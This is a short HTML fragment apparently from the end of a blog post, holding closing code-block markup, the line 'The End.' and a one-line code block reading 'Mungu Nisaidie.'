</pre></td></tr></tbody></table></code></pre></div></div>
<p>The End.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>Mungu Nisaidie.
</pre></td></tr></tbody></table></code></pre></div></div>
:ET